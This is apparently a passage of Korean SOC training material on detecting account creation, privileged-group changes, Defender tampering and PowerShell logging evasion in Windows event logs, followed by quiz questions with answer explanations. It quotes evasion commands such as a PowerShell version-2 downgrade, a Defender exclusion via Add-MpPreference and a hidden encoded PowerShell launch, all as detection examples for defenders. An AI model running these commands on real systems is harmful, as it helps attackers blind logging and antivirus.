    [보충] 위의 로깅은 모두 PowerShell 5에서 생겼습니다. PowerShell 2.0에는 하나도 없었고, 공격자들은 오랫동안 powershell.exe -Version 2 -Command ...로 그냥 피해 갔습니다(ATT&CK T1562.010, Downgrade Attack). 알아보는 표시는 Windows PowerShell 로그의 예전부터 있던 이벤트 400에 HostVersion=2.0, EngineVersion=2.0이 찍히는 것입니다. Microsoft는 이제 PowerShell 2.0 엔진을 Windows 11(24H2)과 Windows Server 2025에서 제거했습니다(2025년 8–9월 업데이트부터). 그래서 이 버전들에서는 이 수법이 더 이상 통하지 않습니다. 오래된 시스템에서는 선택적 기능 Windows PowerShell 2.0 Engine을 직접 제거하고, 버전 2.0이 찍힌 이벤트 400에 계속 경보를 걸어 두세요.

    PowerShell 7(따로 설치하는 크로스 플랫폼 버전, pwsh.exe)도 4103/4104를 똑같이 만들지만, 자기만의 채널인 PowerShellCore/Operational에 쓰고, 자기만의 정책 설정을 읽습니다. PowerShell 7이 깔린 컴퓨터는 그 채널을 모으고 PowerShell 7 정책을 따로 설정해야 합니다. 안 그러면 공격자가 powershell.exe 대신 pwsh.exe를 쓰기만 하면 됩니다. PowerShell 엔진을 품는 다른 프로그램들(System.Management.Automation.dll을 불러오는 직접 만든 .NET 프로그램, 이른바 "powershell.exe 없는 PowerShell")도 스크립트 블록 로깅이 켜져 있으면 4104를 남깁니다. 로깅이 .exe가 아니라 엔진 안에 있기 때문입니다.

    SOC에서 써먹기¶

    • 채널을 모읍니다. Security(4720–4767, 4781, 4727–4737, 4754–4758), Microsoft-Windows-Windows Defender/Operational, Microsoft-Windows-PowerShell/Operational, Windows PowerShell(400/800), 그리고 PowerShell 7이 있는 곳은 PowerShellCore/Operational. 모든 도메인 컨트롤러에서.
    • 확신도 높은 경보: Administrators(S-1-5-32-544), Domain Admins, Enterprise Admins, Schema Admins, Backup Operators, Account Operators, DnsAdmins에 구성원 추가 — SID 기준으로, 4732/4728/4756 모두; 같은 SubjectLogonId로 4720 뒤에 관리자 그룹 추가; 비어 있지 않은 SidHistory; Defender 5001/5013, 예외를 추가하는 5007, 조치 실패 1118/1119, 모든 HackTool, Exploit, Backdoor, Ransom 탐지; Level 3이거나 위 무늬에 맞는 4104; HostVersion=2.0인 400.
    • 나머지는 쌓아서 봅니다: 호스트별 새 로컬 계정(대부분 0개여야 정상), 주체(Subject)별 그룹 변경, 유형·호스트별 Defender 탐지, 글자 해시로 묶은 4104 블록 — 한 호스트에서만 보인 드문 블록은 읽어 볼 가치가 있습니다.
    • 이벤트끼리 엮습니다: SubjectLogonId → 4624; 4104 ProcessID → 4688/Sysmon 1 부모; Defender Detection ID 1116 → 1117; Defender 탐지 시각 → 몇 초 전의 프로세스, 로그온, 네트워크 이벤트.
    • 시각에 주의합니다: XML SystemTime은 UTC, 글자로 풀린 메시지와 Get-MpThreatDetection은 현지 시각입니다.

    2026년 관점¶

    [2026 현재] 지금도 그대로 유효한 것

    4720, 4722–4726, 4738, 4732/4728/4756과 짝이 되는 제거 이벤트는 Windows 11과 Windows Server 2025에서도 칸까지 그대로이고, 계정 생성과 관리자 그룹 추가는 사람이 직접 들어오는 침해와 랜섬웨어 사건에서 여전히 늘 나오는 단계입니다. Defender Operational 채널과 1116/1117, 1006/1007, 5001, 5007, 5013도 지금 그대로입니다. 스크립트 블록 로깅(4104)과 모듈 로깅(4103)도 설명대로 동작하며, 조사에서 가장 가치 있는 Windows 로그에 여전히 속합니다. 4104는 지금도 출력을 남기지 않으니 기록(transcription)도 여전히 중요합니다.

    [변경됨] 바뀐 점

    • 이름. "Windows Defender ATP"는 Microsoft Defender for Endpoint가 됐고, Microsoft Defender XDR(예전 Microsoft 365 Defender)의 일부로서 Microsoft Sentinel과 함께 통합 Microsoft Defender 포털에서 관리됩니다. 백신 자체는 Microsoft Defender Antivirus이지만, 이벤트 채널과 폴더 이름에는 아직 "Windows Defender"가 남아 있습니다.
    • 변조 방지(tamper protection) 는 가정용 사용자와 새 Defender for Endpoint 테넌트에서 기본으로 켜져 있습니다. 그래서 Defender를 끄려는 시도가 성공한 5001보다 5013으로 보이는 일이 늘었습니다. 공격자들은 예외 악용, 취약한 드라이버로 보안 도구 죽이기, 다른 회사 EDR 아래에서 Defender가 수동 모드인 컴퓨터 노리기로 옮겨 갔습니다.
    • PowerShell 2.0이 사라졌습니다. Windows 11 24H2와 Windows Server 2025에서 제거됐고(2025년 8–9월 업데이트부터), 그 버전들에서는 고전적인 다운그레이드 길이 막혔습니다. 오래된 시스템은 여전히 직접 기능을 제거해야 합니다.
    • ATT&CK 매핑. 계정 생성 T1136.001/.002, 특권 그룹에 추가 T1098.007(2024년에 추가된 하위 기법), PowerShell T1059.001, 명령 난독화 T1027.010, Defender 끄기 T1562.001, PowerShell 다운그레이드 T1562.010.
    • 아이덴티티 공격도 클라우드로 옮겨 갔습니다. 하이브리드 환경에서 Microsoft Entra ID(예전 Azure AD)에 계정을 만들거나 역할을 붙이는 건 4720/4728의 클라우드 버전입니다. Windows Security 로그가 아니라 Entra 감사 로그에 남으니 따로 모아야 합니다.

    [주의] 옛 방식대로 하면 틀리거나 위험한 것

    • 4728만 지켜보지 마세요. DC의 기본 Administrators는 4732, Enterprise Admins는 4756입니다.
    • MemberName이나 영어 그룹 이름으로 맞추지 마세요. MemberSid와 그룹의 TargetSid를 쓰세요.
    • DC 한 대에서만 모으지 마세요. 변경은 그걸 처리한 DC에만 남습니다.
    • 조치가 성공했다고 Defender 경보를 닫지 마세요. 어떻게 들어왔는지, 실행됐는지, 또 뭐가 있는지 확인하세요. 특히 HackTool 탐지는요.
    • 5007을 무시하지 마세요. 새 예외는 진짜 도구가 도착하기 바로 전 순간인 경우가 많습니다.
    • 4104가 PowerShell 7을 다루거나 출력을 보여 준다고 생각하지 마세요. PowerShellCore/Operational을 모으고, 출력은 기록(transcription)으로 남기세요.
    • 시끄럽다고 스크립트 블록 로깅을 끄지 마세요. 로그 크기를 늘리고, 전달하고, SIEM에서 거르세요.
    • 다시 합친 공격 코드를 콘솔에 붙여 넣지 마세요. 글자로만 읽으세요.

    확인 문제¶

    문제 1¶

    도메인 컨트롤러 DC-01에서 4732를 찾았습니다. TargetUserName Administrators, TargetDomainName Builtin, TargetSid S-1-5-32-544, MemberName CN=Backup Svc,OU=Service Accounts,DC=corp,DC=example, Subject CORP\it.ops3. 동료가 "4732는 컴퓨터 한 대의 로컬 그룹이니까 DC-01에만 영향이 있어. 우선순위 낮음."이라고 합니다. 맞나요? 어떻게 하겠습니까?

    정답과 해설

    아닙니다. 도메인 컨트롤러에는 보통 말하는 "로컬" 그룹이 없습니다. DC의 BUILTIN\Administrators는 Active Directory에 저장되어 모든 도메인 컨트롤러가 함께 쓰는 도메인 로컬 그룹입니다. 여기 구성원은 모든 DC의 관리자이고, 사실상 도메인 전체를 손에 쥔 것입니다. Domain Admins만큼 강합니다. 그래서 이벤트가 4728(글로벌, 예: Domain Admins)이 아니라 4732(도메인 로컬 범위)인 겁니다.

    이번에는 구성원이 AD 개체(Service Accounts OU의 Backup Svc)라서 MemberName이 채워져 있고, MemberSid가 정확히 누구인지 알려 줍니다. 다음 할 일: 높은 우선순위로 다루세요(T1098.007). it.ops3의 변경 요청서가 있는지 확인하고, SubjectLogonId의 4624(로그온 유형과 출발지)를 찾고, Backup Svc 계정이 최근에 만들어졌는지(어느 DC에서든 4720) 바뀌었는지(4738, 비밀번호 재설정 4724) 보고, 변경 이후 그 계정의 로그온을 찾고, 승인되지 않았다면 증거를 보존한 뒤 그룹에서 빼세요.

    문제 2¶

    WS-044에서 10분 안에 이런 것들이 보입니다. Defender 5007의 새 값이 HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\ProgramData\Sync = 0x0; 그다음 Add-MpPreference -ExclusionPath 'C:\ProgramData\Sync'가 든 4104(Level 3); 그다음 Threat Name Behavior:Win32/..., Path process:_pid:6120인 1116; 그리고 C:\ProgramData\Sync 안의 파일 탐지는 하나도 없습니다. 무슨 일이 있었고, 왜 파일 탐지가 없었는지 설명하세요.

    정답과 해설

    누군가 PowerShell(Add-MpPreference -ExclusionPath)로 Defender에게 C:\ProgramData\Sync를 검사하지 말라고 시켰습니다. T1562.001, Impair Defenses입니다. 4104는 명령 글자를 남겼고(Defender 설정을 건드려서 Warning 수준), 5007은 그 결과로 바뀐 설정(Exclusions\Paths 아래의 새 레지스트리 값)을 남겼습니다. 이걸 하려면 관리자 권한이 필요하니, 행위자는 이미 관리자 권한이 있었습니다.

    예외 경로의 파일은 검사하지 않으니, 거기 떨군 도구는 1116 파일 탐지를 만들지 않습니다. 공격자가 바란 그대로입니다. 그런데도 행위 탐지(Behavior:, 실행 중인 프로세스 pid:6120)는 떴습니다. 행위 감시는 디스크의 파일만이 아니라 프로세스가 무엇을 하는지 보기 때문입니다. 다음 할 일: 4688/Sysmon 1에서 PID 6120을 찾고(이미지 경로 — 아마 예외 폴더 안 — 부모, 명령줄), 4104 뒤의 PowerShell 프로세스(Execution ProcessID)와 그 부모를 찾고, C:\ProgramData\Sync의 파일 목록과 해시를 뽑고, 예외를 지우고, 다른 호스트에도 같은 5007이 있는지 보세요. 변조 방지가 왜 못 막았는지도 짚어 두세요. 변조 방지는 예외가 중앙에서(예: Intune) 변조 방지 대상이 되게 설정되어 관리될 때만 예외를 지켜 줍니다.

    문제 3¶

    WS-031의 4688에 부모가 WINWORD.EXE인 powershell.exe -nop -w hidden -enc JABzAD0A...가 보입니다. 그 시간대 그 호스트의 PowerShell Operational 로그에는 관리 에이전트가 만든 Level 5 이벤트 몇 개뿐이고, 인코딩된 명령에 해당하는 4104는 없습니다. 그리고 Windows PowerShell 로그에 HostVersion=2.0인 이벤트 400이 있습니다. 지금 보고 있는 게 무엇인지, 그리고 이 호스트의 설정에 대해 무엇을 알려 주는지 설명하세요.

    정답과 해설

    Word가 인코딩된 명령으로 숨긴 PowerShell을 띄우는 건 전형적인 악성 문서 사슬입니다(T1566.001 → T1059.001). 보통이라면 스크립트 블록 로깅이 풀린 코드를 4104에 남겼을 겁니다. 4104가 없고 HostVersion=2.0인 이벤트 400이 있다는 건, 페이로드가 PowerShell 버전 2를 띄웠다는 뜻입니다(예: -Version 2나 v2 엔진 직접 호출). 버전 2에는 스크립트 블록 로깅도 모듈 로깅도 없습니다. 다운그레이드 공격(T1562.010)입니다. 인코딩된 명령은 로깅할 수 있는 엔진에 한 번도 닿지 않았습니다.

    이건 그 호스트에 Windows PowerShell 2.0 엔진이 아직 깔려 있다는 뜻이고(즉 최신 Windows 11 24H2 / Server 2025가 아니거나, 기능을 다시 추가함), 버전 2.0이 찍힌 이벤트 400에 대한 경보도 없었다는 뜻입니다. 다음 할 일: 4688 명령줄의 Base64를 분석 환경에서 직접(UTF-16LE로) 풀어 명령을 보고, 다운로드 흔적을 네트워크 로그에서 찾고, 그 PowerShell의 자식 프로세스를 따라가세요. 고치는 쪽으로는 전체 컴퓨터에서 PowerShell 2.0 기능을 제거하고 이벤트 400 경보를 추가하세요.
